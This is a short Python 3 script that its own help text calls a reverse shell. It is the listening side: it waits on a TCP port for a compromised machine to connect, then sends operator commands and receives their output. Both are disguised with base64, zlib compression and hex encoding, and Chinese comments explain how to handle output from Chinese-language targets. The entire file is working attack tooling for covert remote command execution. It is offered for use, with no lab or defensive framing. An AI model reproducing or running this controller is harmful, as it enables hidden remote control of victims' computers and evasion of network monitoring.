#coding=utf-8

import socket, argparse
import platform
import base64
import binascii
import zlib

def connect(host, port):

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind((host, port))
    s.listen(1) 
    print('listen at ', s.getsockname())
    conn, addr = s.accept()
    print ('[+] Got a connection from', addr)
    try:

        while True:

            command = input("Shell> ")        
            command_en = command.encode('utf-8')
            command_en = base64.b64encode(command_en) # base64 编码
            command_en = zlib.compress(command_en) # zlib 压缩
            command_en = binascii.b2a_hex(command_en) # 字节转 ascii 再 Hex

            if 'quit' in command:
                conn.send(command_en)
                conn.close()
                break

            else:        
                conn.send(command_en)
                result = conn.recv(10240) # 此处的值不宜过小，否则可能无法接收完整数据    
                result = binascii.a2b_hex(result) 
                result = zlib.decompress(result)
                data = base64.b64decode(result)
                print(data.decode('utf-8')) # 若目标是中文系统（GBK 编码），则需要改为 data.decode('gbk')
                #print( conn.recv(1024).decode())
    except Exception as e:
        print(e)
            
def main():
    parser = argparse.ArgumentParser(description='Python3 Reverse Shell')
    parser.add_argument('host', help=' interface the server listens at;')
    parser.add_argument('port', type=int, default=4444, help='tcp port')
    args = parser.parse_args()
    if args.host:
        connect(args.host, args.port)
main()